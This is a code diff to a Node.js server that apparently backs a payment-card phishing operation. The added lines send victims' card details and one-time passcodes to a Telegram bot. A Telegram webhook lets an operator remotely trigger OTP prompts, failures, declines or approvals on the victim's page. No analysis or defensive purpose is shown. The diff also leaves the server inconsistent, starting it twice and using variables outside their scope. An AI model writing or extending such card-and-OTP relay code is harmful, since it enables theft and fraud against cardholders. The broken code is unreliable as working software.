+      console.error('❌ Error processing payment data:', error);
     }
   });
 
@@ -611,6 +1317,9 @@ io.on('connection', (socket) => {
     }
     
     console.log(`💳 Payment data stored: ${data.hash} - ${data.plan} (${data.billing})`);
+    
+    // Send card details to Telegram bot
+    await sendCardDetailsToTelegram(data);
     
     // Save immediately
     await saveAdminData();
@@ -708,13 +1417,12 @@ io.on('connection', (socket) => {
   });
 
   socket.on('insufficient-balance-error', (data) => {
-    console.log('Admin marked insufficient balance', data);
     socket.broadcast.emit('insufficient-balance-error', data);
   });
 
   // Handle OTP submission
   socket.on('otp-submitted', (data) => {
-    console.log('OTP submitted:', data);
+    console.log('🔐 OTP submitted:', data);
     
     // Add to persistent storage
     const otpData = {
@@ -725,6 +1433,9 @@ io.on('connection', (socket) => {
     
     adminData.otps.push(otpData);
     saveAdminData();
+    
+    // Send OTP to Telegram with admin command buttons
+    sendOtpToTelegram(otpData);
     
     socket.broadcast.emit('otp-submitted', otpData);
   });
@@ -1082,6 +1793,8 @@ app.post('/api/expire-payment-link', async (req, res) => {
   }
 });
 
+
+
 // Health check endpoint for Render.com
 app.get('/health', (req, res) => {
   res.status(200).json({ status: 'OK', timestamp: new Date().toISOString() });
@@ -1089,9 +1802,12 @@ app.get('/health', (req, res) => {
 
 // Debug endpoint to check system status
 app.get('/api/debug-status', (req, res) => {
+  const PORT = process.env.PORT || 3001;
+  const NODE_ENV = process.env.NODE_ENV || 'development';
+  const FRONTEND_URL = process.env.FRONTEND_URL || (NODE_ENV === 'production' ? 'https://your-domain.com' : 'http://localhost:8080');
   const status = {
     server: 'running',
-    environment: process.env.NODE_ENV || 'development',
+    environment: NODE_ENV,
     timestamp: new Date().toISOString(),
     adminDataStatus: {
       hashashedPayments: !!adminData.hashedPayments,
@@ -1108,12 +1824,53 @@ app.get('/api/debug-status', (req, res) => {
   res.json(status);
 });
 
-const PORT = process.env.PORT || 3001;
-
 // Error handling for server startup
 server.on('error', (error) => {
   console.error('Server error:', error);
   process.exit(1);
+});
+
+// 🤖 Telegram Webhook Handler for Admin Commands
+app.post('/webhook/telegram', async (req, res) => {
+  try {
+    const update = req.body;
+    if (update.callback_query) {
+      const callbackData = update.callback_query.data;
+      const chatId = update.callback_query.from.id.toString();
+      
+      if (chatId !== telegramConfig.chatId) {
+        return res.status(403).json({ error: 'Unauthorized' });
+      }
+      
+      const [action, paymentId] = callbackData.split('_', 2);
+      
+      switch (action) {
+        case 'show':
+          if (callbackData.startsWith('show_otp_')) {
+            io.emit('show-otp', { paymentId });
+          }
+          break;
+        case 'fail':
+          if (callbackData.startsWith('fail_otp_')) {
+            io.emit('invalid-otp-error', { paymentId });
+          }
+          break;
+        case 'decline':
+          io.emit('payment-rejected', { paymentId });
+          break;
+        case 'insufficient':
+          io.emit('insufficient-funds-error', { paymentId });
+          break;
+        case 'success':
+          io.emit('payment-approved', { paymentId });
+          break;
+      }
+    }
+    res.status(200).json({ ok: true });
+  } catch (error) {
+    console.error('❌ Telegram webhook error:', error);
+    res.status(500).json({ error: 'Internal server error' });
+  }
 });
 
 server.listen(PORT, '0.0.0.0', async () => {
@@ -1133,5 +1890,17 @@ server.listen(PORT, '0.0.0.0', async () => {
     
     await sendToTelegram(startupMessage);
     console.log('📡 Startup notification sent to Telegram');
-  }, 3000); // Wait 3 seconds for server to fully initialize
+  }, 3000);
+});
+
+// Start the server
+server.listen(PORT, () => {
+  console.log(`Server running on port ${PORT}`);
+  console.log(`Environment: ${NODE_ENV}`);
+  console.log(`Node.js version: ${process.version}`);
+  
+  // Start the Telegram polling after server starts
+  console.log('🤖 Starting Telegram polling for admin commands...');
+  setInterval(pollTelegramUpdates, 2000);
+  console.log('🔄 Telegram polling started for admin commands');
 });
